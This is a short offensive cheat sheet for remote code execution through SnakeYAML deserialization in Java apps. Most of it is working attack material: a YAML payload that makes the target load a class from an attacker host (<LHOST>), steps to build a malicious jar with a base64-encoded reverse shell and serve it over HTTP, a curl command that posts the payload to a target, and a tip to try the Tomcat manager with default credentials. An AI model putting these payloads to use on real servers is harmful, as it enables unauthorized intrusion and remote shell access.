# SnakeYAML Deserialization RCE

SnakeYAML (Java) deserializes YAML into Java objects. Crafted input using `!!javax.script.ScriptEngineManager` with a `URLClassLoader` causes the server to fetch and execute a remote Java class, resulting in RCE.

## POC Payload

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<LHOST>/"]
  ]]
]
```

## Full Exploit with yaml-payload

```bash
# 1. Clone yaml-payload (marshalsec-style loader)
git clone https://github.com/artsploit/yaml-payload
cd yaml-payload/src

# 2. Edit AwesomeScriptEngineFactory.java — add reverse shell in constructor:
#    Runtime.getRuntime().exec("bash -c {echo,<BASE64_CMD>}|{base64,-d}|bash");

# 3. Compile
javac artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C . .

# 4. Serve the jar
python3 -m http.server 80

# 5. Submit YAML payload pointing to your server
# (adjust URL path if needed: http://<LHOST>/yaml-payload.jar)
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<LHOST>/yaml-payload.jar"]
  ]]
]
```

## Trigger via Web Form

```bash
curl -X POST "http://<TARGET>:8080/test" \
  -H "Content-Type: text/plain" \
  --data-binary @payload.yaml
```

## Notes
- Requires Java on server (common with Tomcat / Spring apps)
- The `ScriptEngineManager` fetches `META-INF/services/javax.script.ScriptEngineFactory` from the jar
- Check for Tomcat manager (`/manager`) with default creds as alternative path
- Runs as the application user (e.g., `tomcat`)
